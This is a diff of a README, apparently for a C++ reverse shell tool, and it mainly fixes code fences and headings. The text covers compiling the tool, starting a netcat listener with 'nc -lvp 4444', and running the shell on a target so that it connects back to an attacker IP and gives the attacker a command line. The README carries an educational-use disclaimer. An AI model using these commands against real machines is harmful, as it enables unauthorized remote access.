@@ -29,21 +29,21 @@ Compile the Code:
 ```bash
 
 g++ -o reverse_shell reverse_shell.cpp
-
+```
 For Windows, you might use:
 
 ```bash
 
     cl /EHsc reverse_shell.cpp
-
+```
 - How to Use
 
     Start a Listener on the Attacker Machine:
     You can use netcat to start a listener. For example:
 
     ``` bash
-
-nc -lvp 4444
+    nc -lvp 4444
+   ```
 
 Run the Reverse Shell on the Target Machine:
 Ensure the target machine can reach the attacker's IP and port. Run the compiled reverse_shell executable:
@@ -51,16 +51,17 @@ Ensure the target machine can reach the attacker's IP and port. Run the compiled
 ```bash
 
 ./reverse_shell <attacker_ip> <port>
-
+```
 For example:
 
-bash
+```bash
 
     ./reverse_shell 192.168.1.10 4444
+```
 
-    Establish Connection:
-    Once the reverse shell is executed on the target machine, it will connect back to the attacker's machine, providing a command line interface to the attacker.
+  Establish Connection:
+  Once the reverse shell is executed on the target machine, it will connect back to the attacker's machine, providing a command line interface to the attacker.
 
-Disclaimer
+## Disclaimer
 
 This tool is intended for educational purposes only. Unauthorized use of this tool is illegal and unethical. Always obtain proper authorization before using it in any environment.
